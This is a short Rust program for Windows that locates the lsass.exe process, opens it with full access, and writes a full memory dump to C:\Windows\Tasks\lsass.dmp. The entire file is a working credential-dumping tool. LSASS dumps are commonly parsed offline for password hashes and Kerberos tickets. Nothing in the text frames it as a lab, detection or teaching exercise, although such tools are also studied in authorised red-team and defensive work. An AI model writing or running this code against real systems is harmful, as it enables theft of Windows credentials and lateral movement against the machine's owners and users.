use std::{ffi::CString, process::exit, ptr::null_mut};
use sysinfo::{PidExt, ProcessExt, System, SystemExt};
use windows::core::PCSTR;
use windows::Win32::Foundation::{CloseHandle, HANDLE};
use windows::Win32::Storage::FileSystem::{
    CreateFileA, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, FILE_GENERIC_WRITE, FILE_SHARE_READ,
    FILE_SHARE_WRITE,
};
use windows::Win32::System::{
    Diagnostics::Debug::{
        MiniDumpWithFullMemory, MiniDumpWriteDump
    }, 
    Threading::{
        OpenProcess, PROCESS_ALL_ACCESS
    }
};

fn find_lsass() -> Result<u32, String> {
    let mut system = System::new_all();
    system.refresh_all();

    let lsass_processes: Vec<_> = system
        .processes()
        .values()
        .filter(|process| process.name().to_lowercase() == "lsass.exe")
        .collect();

    for process in lsass_processes {
        println!("[i] LSASS process with PID found: {}", process.pid());

        return Ok(process.pid().as_u32());
    }

    return Err(String::from("Error finding lsass PID!"));
}

fn main() {
    unsafe {
        let pid_lsass = find_lsass().unwrap_or_else(|e| {
            panic!("[!] find_lsass Failed With Error: {e}");
        });

        let hprocess = OpenProcess(PROCESS_ALL_ACCESS, false, pid_lsass).unwrap_or_else(|e| {
            panic!("[!] OpenProcess Failed With Error: {e}");
        });

        let path = CString::new("C:\\Windows\\Tasks\\lsass.dmp").expect("CString::new failed");

        let hfile = CreateFileA(
            PCSTR(path.as_ptr() as *const u8),
            FILE_GENERIC_WRITE.0,
            FILE_SHARE_READ | FILE_SHARE_WRITE,
            Some(null_mut()),
            CREATE_ALWAYS,
            FILE_ATTRIBUTE_NORMAL,
            HANDLE(0),
        ).unwrap_or_else(|e| {
            panic!("[!] CreateFileA Failed With Error: {e}");
        });

        println!("[+] HANDLE lsass.exe: {:?}", hprocess);
        println!("[+] PID: {:?}", pid_lsass);

        MiniDumpWriteDump(
            hprocess,
            pid_lsass,
            hfile,
            MiniDumpWithFullMemory,
            None,
            None,
            None,
        ).unwrap_or_else(|e| {
            panic!("[!] MiniDumpWriteDump Failed With Error: {e}");
        });

        println!("[+] lsass dump successful!");

        CloseHandle(hprocess);
        CloseHandle(hfile);
    }
}
